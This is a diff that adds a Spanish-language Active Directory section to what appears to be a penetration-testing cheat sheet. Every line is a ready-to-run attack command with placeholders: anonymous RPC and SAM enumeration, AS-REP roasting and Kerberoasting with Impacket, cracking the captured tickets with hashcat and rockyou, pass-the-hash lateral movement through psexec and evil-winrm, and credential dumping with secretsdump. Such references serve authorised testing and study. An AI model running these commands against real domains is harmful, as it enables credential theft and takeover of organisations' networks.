@@ -1,0 +1,26 @@
+# 6. Active Directory
+
+**Enumeración con Impacket (desde fuera):**
+
+  impacket-rpcclient -U "" -N <IP>
+
+  impacket-samrdump <DOMAIN>/<USER>:<PASS>@<IP>
+
+  impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <IP>  # AS-REP Roasting
+
+**Kerberoasting:**
+
+  impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request
+  
+  hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+
+**Movimiento Lateral y Pass-the-Hash (PtH):**
+
+  impacket-psexec <DOMAIN>/<USER>@<IP> -hashes <LM_HASH>:<NT_HASH>
+  
+  evil-winrm -i <IP> -u <USER> -H <NT_HASH>
+
+**Dump the credenciales (Si se es Administrador o SYSTEM):**
+
+  impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
+
